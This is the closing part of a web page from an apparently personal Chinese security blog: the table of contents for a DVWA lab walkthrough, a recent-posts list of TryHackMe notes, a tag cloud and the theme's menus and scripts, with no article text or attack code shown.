toc-level-2"><a class="toc-link" href="#high"><span class="toc-number">5.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impossible"><span class="toc-number">5.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-insecure-captcha"><span class="toc-number">6.</span> <span class="toc-text">0x06 Insecure CAPTCHA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">6.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium"><span class="toc-number">6.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high"><span class="toc-number">6.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impossible"><span class="toc-number">6.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-sql-injection"><span class="toc-number">7.</span> <span class="toc-text">0x07 SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">7.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium"><span class="toc-number">7.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high"><span class="toc-number">7.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impossible"><span class="toc-number">7.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-sql-injection-blind"><span class="toc-number">8.</span> <span class="toc-text">0x08 SQL Injection (Blind)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">8.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium"><span class="toc-number">8.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high"><span class="toc-number">8.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impossible"><span class="toc-number">8.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-weak-session-ids"><span class="toc-number">9.</span> <span class="toc-text">0x09 Weak Session IDs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">9.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium"><span class="toc-number">9.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high"><span class="toc-number">9.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impossible"><span class="toc-number">9.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-xssdom"><span class="toc-number">10.</span> <span class="toc-text">0x10 XSS(DOM)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">10.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium"><span class="toc-number">10.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#high"><span class="toc-number">10.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impossible"><span class="toc-number">10.4.</span> <span class="toc-text">Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-xssreflected"><span class="toc-number">11.</span> <span class="toc-text">0x11 XSS(Reflected)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#low"><span class="toc-number">11.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medium"><span class="toc-number">11.2.</span> <span class="toc-text">Medium</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>